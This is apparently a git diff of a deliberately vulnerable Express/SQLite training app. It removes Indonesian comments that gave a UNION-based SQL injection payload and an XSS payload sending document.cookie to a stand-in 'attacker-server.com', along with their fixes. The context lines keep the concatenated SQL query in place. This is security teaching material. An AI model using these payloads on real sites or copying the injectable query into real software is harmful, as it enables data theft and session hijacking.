@@ -77,14 +77,6 @@ app.get('/', (req, res) => {
 app.get('/search', (req, res) => {
   const q = req.query.q || '';
   // Vulnerable SQL concatenation:
-  // Dengan memasukan ' UNION SELECT 1,sqlite_version(),name FROM sqlite_master WHERE type='table' -- ke dalam search
-  // List kolom dan version sqlite berhasil didapatkan dari tabel
-  // Ini karena query tidak di parameterized sehingga memungkinkan injeksi SQL
-  // Untuk memperbaiki, gunakan prepared statement atau parameterized query
-  // contoh:
-  // const sql = `SELECT id, title, content FROM posts WHERE title LIKE ? OR content LIKE ?`;
-  // const params = [`%${q}%`, `%${q}%`];
-  // db.all(sql, params, (err, rows) => { ... });
 
   const sql = `SELECT id, title, content FROM posts WHERE title LIKE '%${q}%' OR content LIKE '%${q}%'`;
   console.log('[SQL] Executing:', sql);
@@ -130,14 +122,6 @@ app.get('/posts/:id', (req, res) => {
  * Mitigation: encode on output; sanitize input before storing if HTML allowed.
  */
 
-/**
- * Input pengguna disimpan dalam database tanpa sanitasi dan kemudian ditampilkan langsung dalam HTML.
- * Ini memungkinkan penyerang untuk menyisipkan skrip berbahaya yang akan dieksekusi di browser pengguna lain yang melihat komentar tersebut.
- * contoh payload: <script>alert('XSS')</script>, <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" onerror="this.src='https://attacker-server.com/steal?c='+document.cookie">
- * Untuk memperbaiki, lakukan sanitasi pada input sebelum menyimpannya ke database atau lakukan encoding pada output.
- * Contoh penggunaan fungsi escapeHtml: ${escapeHtml(r.body)}   
- */
-
 app.get('/comments', (req, res) => {
   const postFilter = req.query.post ? `WHERE post_id=${Number(req.query.post)}` : '';
   db.all(`SELECT id, post_id, author, body FROM comments ${postFilter} ORDER BY id DESC`, [], (err, rows) => {
@@ -174,15 +158,6 @@ app.post('/comments', (req, res) => {
  * VULN: Reflected XSS
  * The msg parameter is reflected directly into HTML (unescaped in one place).
  * Mitigation: escape/encode before insertion; validate input.
- */
-
-/**
- * Input pengguna dari parameter query "msg" disisipkan langsung ke dalam respons HTML tanpa sanitasi.
- * Mirip seperti stored XSS, ini memungkinkan penyerang untuk menyisipkan skrip berbahaya yang akan dieksekusi di browser pengguna yang mengunjungi URL tersebut.
- * contoh payload: <script>alert('XSS')</script>, <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" onerror="this.src='https://attacker-server.com/steal?c='+document.cookie">
- * Untuk memperbaiki, lakukan sanitasi pada input sebelum menyisipkannya ke dalam HTML atau lakukan encoding pada output.
- * Contoh penggunaan fungsi escapeHtml: ${escapeHtml(msg)}, terutama pada bagian yang rentan seperti di bawah ini:
- * <p>Server echoed (vulnerable): ${escapeHtml(msg)}</p> <!-- vulnerable: msg not escaped here
  */
 
 app.get('/reflect', (req, res) => {
